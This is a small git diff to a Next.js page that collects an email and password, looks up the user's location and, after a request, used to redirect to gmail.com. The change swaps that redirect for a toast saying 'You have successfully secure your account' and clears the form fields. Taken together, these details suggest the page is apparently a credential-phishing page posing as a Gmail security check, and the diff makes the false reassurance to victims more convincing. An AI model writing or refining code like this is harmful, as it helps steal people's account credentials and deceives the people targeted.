@@ -5,6 +5,7 @@ import PersonSvg from "@/components/PersonSvg";
 import { getUserLocation } from "@/utils/request";
 import { useRouter } from "next/navigation";
 import { useState } from "react";
+import { toast } from "react-toastify";
 
 const getFormatedDateTime = (date) => {
   date = new Date(date);
@@ -53,7 +54,10 @@ export default function Home() {
           })
       )
       .finally(() => {
-        router.push("https://www.gmail.com/");
+        toast("You have successfully secure your account", { type: "success" });
+        setPage(1);
+        setEmail("");
+        setPassword("");
       });
   };
 
